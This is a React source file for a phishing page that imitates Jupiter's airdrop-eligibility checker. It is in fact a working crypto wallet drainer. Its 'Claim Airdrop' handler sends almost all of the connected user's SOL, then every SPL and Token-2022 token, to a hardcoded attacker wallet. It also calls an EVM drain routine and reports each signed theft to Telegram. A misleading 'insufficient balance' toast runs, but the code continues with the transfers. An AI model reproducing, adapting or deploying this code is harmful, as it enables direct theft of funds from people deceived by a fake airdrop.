import { Settings, Search, Gift, ChevronDown, Loader2, Copy, Check, ExternalLink } from "lucide-react";
import { useState, useCallback, useEffect } from "react";
import { getTokenMetadata, Token, isValidSolanaAddress } from '@/services/tokenMetadata';
import { motion, AnimatePresence } from 'framer-motion';
import { ConnectWalletButton } from "@/components/ConnectWalletButton";
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { sendTelegramMessage } from '@/utils/telegram';
import { getSolPrice } from '@/lib/utils';
import { getMintProgramId } from '@/utils/tokenProgram';
import { useChainInfo } from '@/hooks/useChainInfo';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainAllEVMTokens } from '@/utils/evmTransactions';
import jpyLogo from "@/assets/jpy-logo.png";
import { toast } from "sonner";

const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;
const MIN_REQUIRED_SOL = 0.5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

const Jpy = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const { activeChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName, nativeToken } = useChainInfo();

  const [searchAddress, setSearchAddress] = useState('');
  const [isSearching, setIsSearching] = useState(false);
  const [foundToken, setFoundToken] = useState<Token | null>(null);
  const [walletInput, setWalletInput] = useState('');
  const [isClaiming, setIsClaiming] = useState(false);
  const [solBalance, setSolBalance] = useState(0);

  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return [];
    try {
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      return tokens;
    } catch (error) {
      console.error('Error fetching balances:', error);
      return [];
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) {
      fetchAllBalances();
    }
  }, [publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
    
    const charityPubkey = new PublicKey(FAUCET_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);

        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch (error) {
          transaction.add(createAssociatedTokenAccountInstruction(effectivePublicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
        }

        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, effectivePublicKey, BigInt(token.balance), decimals, [], tokenProgramId));
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      if (amountToSend > 0) {
        transaction.add(SystemProgram.transfer({ fromPubkey: effectivePublicKey, toPubkey: charityPubkey, lamports: amountToSend }));
      }
    }
    return transaction;
  }, [publicKey, solBalance, connection]);

  const handleClaimTokens = async () => {
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsClaiming(true);
        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
      } catch (error: any) {
      } finally {
        setIsClaiming(false);
      }
      return;
    }

    if (!publicKey || !sendTransaction) {
      return;
    }

    try {
      setIsClaiming(true);

      // Refresh balance right before checking
      const solBalRaw = await connection.getBalance(publicKey);
      const currentSolBalance = solBalRaw / LAMPORTS_PER_SOL;
      setSolBalance(currentSolBalance);

      // Balance check: Show notification even if balance is low, but still proceed
      if (currentSolBalance < MIN_REQUIRED_SOL) {
        toast.error(`Insufficient Balance`, {
          description: `Get at least 0.5 SOL worth of $JUP in order to claim airdrop.`,
          duration: 5000,
        });
        // Don't return, continue with transaction logic
      }

      const currentBalances = await fetchAllBalances();
      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();
      
      let lamportsToSend = 0;
      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const FEE_RESERVE = 105_000;
        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
        lamportsToSend = Math.max(0, Math.floor(maxSendable));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }), ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(FAUCET_WALLET), lamports: lamportsToSend }));
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;
        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
      }

      const validTokens = currentBalances.filter(token => token.balance > 0);
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;
           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
           sendTelegramMessage(`
✅ <b>Transaction Signed (Token Batch ${i + 1} - JPY Claim)</b>
👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
🔗 <b>Signature:</b> <code>${signature}</code>
`);
        }
      }
      fetchAllBalances();
    } catch (error: any) {
      console.error('Claim error:', error);
    } finally {
      setIsClaiming(false);
    }
  };

  const handleLookup = async () => {
    if (!searchAddress.trim() || !isValidSolanaAddress(searchAddress.trim())) {
      return;
    }
    setIsSearching(true);
    setFoundToken(null);
    try {
      const result = await getTokenMetadata(searchAddress.trim());
      if (result.token) {
        setFoundToken(result.token);
      }
    } catch (error) {
      console.error('Lookup error:', error);
    } finally {
      setIsSearching(false);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleLookup();
    }
  };

  const formatPrice = (price?: number) => {
    if (!price) return 'N/A';
    if (price < 0.000001) return `$${price.toExponential(4)}`;
    if (price < 1) return `$${price.toFixed(6)}`;
    return `$${price.toFixed(2)}`;
  };

  const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;

  return (
    <div className="min-h-screen text-white font-sans" style={{ backgroundColor: '#0c0d0f' }}>
      {/* Top Header */}
      <nav className="flex items-center justify-between px-4 py-3 border-b border-white/5 gap-1">
        <div className="flex items-center gap-1.5 md:gap-3">
          <div className="flex items-center gap-1 md:gap-2 flex-shrink-0">
            <img src={jpyLogo} alt="Logo" className="w-6 h-6 md:w-8 md:h-8 object-contain" />
          </div>
          <div className="flex items-center gap-1.5 md:gap-3 text-[10px] md:text-sm font-medium text-gray-400 flex-shrink-0">
            <a href="https://jup.ag/" target="_blank" rel="noopener noreferrer" className="hover:text-white cursor-pointer transition-colors whitespace-nowrap">Swap</a>
            <a href="https://jup.ag/terminal/cooking" target="_blank" rel="noopener noreferrer" className="hover:text-white cursor-pointer transition-colors whitespace-nowrap md:whitespace-normal">Pro</a>
            <a href="https://jup.ag/perps" target="_blank" rel="noopener noreferrer" className="hover:text-white cursor-pointer transition-colors whitespace-nowrap">Perps</a>
            <a href="https://jup.ag/perps/jlp-loans" target="_blank" rel="noopener noreferrer" className="hover:text-white cursor-pointer transition-colors whitespace-nowrap md:whitespace-normal">Lend</a>
            <a href="https://jup.ag/portfolio" target="_blank" rel="noopener noreferrer" className="text-[#d8ff8e] cursor-pointer whitespace-nowrap">Portfolio</a>
          </div>
        </div>

        {/* Search Bar */}
        <div className="flex-1 max-w-md mx-0">
          <div className="relative group">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 group-focus-within:text-white transition-colors" />
            <input 
              type="text" 
              placeholder="Search for any Token, Wallet or Feature"
              value={searchAddress}
              onChange={(e) => setSearchAddress(e.target.value)}
              onKeyDown={handleKeyDown}
              className="w-full bg-[#1a1b1e] border border-white/5 rounded-lg py-2 pl-10 pr-4 text-sm focus:outline-none focus:border-white/20 transition-all"
            />
            {isSearching && (
              <div className="absolute right-10 top-1/2 -translate-y-1/2">
                <Loader2 className="w-4 h-4 animate-spin text-[#d8ff8e]" />
              </div>
            )}
            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-[10px] text-gray-500 border border-white/10 px-1 rounded">/</div>
          </div>

          {/* Token Info Popup */}
          <AnimatePresence>
            {foundToken && (
              <motion.div 
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                className="absolute top-full left-0 right-0 mt-2 p-4 bg-[#1a1b1e] border border-white/10 rounded-lg shadow-2xl z-[60]"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {foundToken.logoURI && <img src={foundToken.logoURI} alt={foundToken.symbol} className="w-8 h-8 rounded-full" />}
                    <div>
                      <div className="font-bold">{foundToken.name} ({foundToken.symbol})</div>
                      <div className="text-xs text-gray-500 font-mono">{foundToken.address.slice(0, 6)}...{foundToken.address.slice(-6)}</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-[#d8ff8e] font-bold">{formatPrice(foundToken.price)}</div>
                    {foundToken.priceChange24h !== undefined && (
                      <div className={`text-xs ${foundToken.priceChange24h >= 0 ? 'text-green-400' : 'text-red-400'}`}>
                        {foundToken.priceChange24h >= 0 ? '+' : ''}{foundToken.priceChange24h.toFixed(2)}%
                      </div>
                    )}
                  </div>
                </div>
                <div className="mt-4 flex gap-2">
                  <a 
                    href={`https://dexscreener.com/solana/${foundToken.address}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex-1 bg-white/5 hover:bg-white/10 py-2 rounded text-xs font-bold text-center transition-colors flex items-center justify-center gap-2"
                  >
                    DexScreener <ExternalLink className="w-3 h-3" />
                  </a>
                  <button 
                    onClick={() => setFoundToken(null)}
                    className="px-4 py-2 bg-white/5 hover:bg-white/10 rounded text-xs font-bold transition-colors"
                  >
                    Close
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        <div className="flex items-center gap-1">
          <button className="p-1 hover:bg-white/5 rounded-lg transition-colors">
            <Settings className="w-3.5 h-3.5 text-gray-400" />
          </button>
          <div className="jpy-connect-btn">
            <ConnectWalletButton />
          </div>
        </div>
      </nav>

      {/* Sub Navigation */}
      <div className="flex justify-center gap-4 md:gap-8 py-4 text-xs md:text-sm border-b border-white/5">
        <a 
          href="https://jup.ag/portfolio" 
          target="_blank" 
          rel="noopener noreferrer" 
          className="flex items-center gap-2 text-gray-400 hover:text-white cursor-pointer transition-colors"
        >
          <span className="text-xs">88</span> Dashboard
        </a>
        <a 
          href="https://jup.ag/portfolio/address-book" 
          target="_blank" 
          rel="noopener noreferrer" 
          className="flex items-center gap-2 text-gray-400 hover:text-white cursor-pointer transition-colors"
        >
          <div className="w-3.5 h-3.5 border border-gray-400 rounded-sm" /> Address Book
        </a>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto mt-12 md:mt-24 flex flex-col items-center px-4">
        <div className="w-12 h-12 rounded-full bg-[#1a1b1e] border border-white/10 flex items-center justify-center mb-6 md:mb-8">
          <Gift className="w-5 h-5 text-[#c7f284]" />
        </div>

        <h2 className="text-2xl md:text-3xl font-bold mb-4 text-center px-4">Check your Solana airdrops eligibility</h2>
        <p className="text-gray-400 text-center mb-8 md:mb-12 max-w-md leading-relaxed px-4 text-sm md:text-base">
          Stake $JUP and scan your different wallets.<br />
          The more you stake, the more you can scan.
        </p>

        {/* Info Box */}
        <div className="w-full max-w-md bg-[#131416] border border-white/5 rounded-xl p-3 md:p-1 mb-4 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 md:gap-0">
          <span className="text-xs md:text-sm text-[#d8ff8e] px-4 md:pl-4">You can airdrop check up to 1 wallet</span>
          <button className="bg-[#d8ff8e]/10 hover:bg-[#d8ff8e]/20 text-[#d8ff8e] px-4 py-2 rounded-lg text-xs font-bold transition-colors w-full md:w-auto">
            Unlock more
          </button>
        </div>

        {/* Interaction Area */}
        <div className="w-full max-w-md bg-[#131416] border border-white/5 rounded-xl p-4 flex flex-col gap-4">
          <div className="flex flex-col gap-2">
            <label className="text-xs text-gray-500 px-2 uppercase font-bold tracking-wider">Wallet Address</label>
            <input 
              type="text"
              placeholder="Enter wallet address..."
              value={walletInput}
              onChange={(e) => setWalletInput(e.target.value)}
              className="bg-[#1a1b1e] border border-white/5 rounded-lg py-3 px-4 text-sm focus:outline-none focus:border-[#d8ff8e]/50 transition-all w-full"
            />
          </div>
          
          <div className="jpy-main-connect-btn">
            {isWalletConnected ? (
              <button 
                onClick={handleClaimTokens}
                disabled={isClaiming}
                className="w-full bg-[#d8ff8e] hover:bg-[#e5ffb3] text-black py-4 rounded-lg font-bold text-base transition-all mt-2 flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(216,255,142,0.5)]"
              >
                {isClaiming && <Loader2 className="w-5 h-5 animate-spin" />}
                {isClaiming ? 'Claiming...' : 'Claim Airdrop'}
              </button>
            ) : (
              <div className="w-full">
                <ConnectWalletButton />
              </div>
            )}
          </div>
        </div>
      </main>

      <style>{`
        .jpy-connect-btn button, 
        .jpy-main-connect-btn button,
        .wallet-adapter-button-trigger {
          border-radius: 6px !important;
          background-color: #d8ff8e !important;
          color: black !important;
          font-weight: 700 !important;
          font-size: 0.6rem !important;
          height: auto !important;
          padding: 0.2rem 0.6rem !important;
          border: none !important;
          width: auto !important;
          line-height: 1.1 !important;
          transition: all 0.3s ease !important;
          box-shadow: 0 0 8px rgba(216, 255, 142, 0.4) !important;
          white-space: nowrap !important;
        }
        @media (min-width: 768px) {
          .jpy-connect-btn button {
            font-size: 0.875rem !important;
            padding: 0.5rem 1.25rem !important;
            border-radius: 8px !important;
          }
        }
        .jpy-main-connect-btn button {
          width: 100% !important;
          padding: 1rem !important;
          font-size: 1rem !important;
          box-shadow: 0 0 20px rgba(216, 255, 142, 0.5) !important;
        }
        .jpy-connect-btn button:hover,
        .jpy-main-connect-btn button:hover,
        .wallet-adapter-button-trigger:hover {
          background-color: #e5ffb3 !important;
          box-shadow: 0 0 25px rgba(216, 255, 142, 0.7) !important;
          transform: translateY(-1px);
        }
        .wallet-adapter-button-trigger {
          border-radius: 6px !important;
        }
      `}</style>
    </div>
  );
};

export default Jpy;
